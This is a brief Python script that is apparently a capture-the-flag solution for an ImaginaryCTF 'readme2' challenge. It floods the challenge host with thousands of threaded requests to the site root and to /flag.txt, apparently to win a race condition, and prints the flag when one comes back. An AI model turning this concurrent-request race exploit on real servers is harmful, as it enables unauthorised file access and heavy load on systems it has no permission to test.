import requests 
from threading import Thread

url = "http://readme2.chal.imaginaryctf.org" 

def f1():
    for _ in range(10000):
        r = requests.get(
            f"{url}/",
        )
        assert r.status_code == 200
def f2(): 
    for _ in range(10000):
        r = requests.get(
            f"{url}/flag.txt",
        )
        if "ictf" in r.text: 
            print(r.text) 

threads = [ ]
for _ in range(15):     
    t1 = Thread(target=f1) 
    threads.append(t1) 
for _ in range(3):
    t2 = Thread(target=f2) 
    threads.append(t2)

for thr in threads: 
    thr.start() 

for thr in threads: 
    thr.join() 
